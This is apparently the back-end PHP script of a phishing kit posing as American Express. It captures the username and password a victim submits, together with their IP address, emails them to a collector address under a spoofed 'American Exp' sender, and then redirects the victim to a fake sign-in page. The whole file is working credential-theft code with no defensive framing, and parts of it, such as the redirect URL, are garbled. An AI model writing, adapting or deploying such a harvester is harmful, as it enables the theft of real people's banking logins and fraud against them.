<?php
$ip = getenv("REMOTE_ADDR");
$message .= "--------------AmeMoney--------------\n";
$message .= "USER: ".$_POST['1id1']."\n";
$message .= "PASS: ".$_POST['3id3']."\n";
$message .= "----------------------------------\n";

$send = "youremail@gmail.com";
$subject = "Ameican Expo - $ip";
$headers = "From: American Exp<Ortis@wixema.com>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
$arr=array($send, $IP);
foreach ($arr as $send)
{
mail($send,$subject,$message,$headers);
}
header("Location: xard.html?section=signinpage&update=&cookiecheck=yes&destination=nba/signin&actionStartup/Application$update=&cookiecheck=yes&destinpage&update=&cookche");
  

?>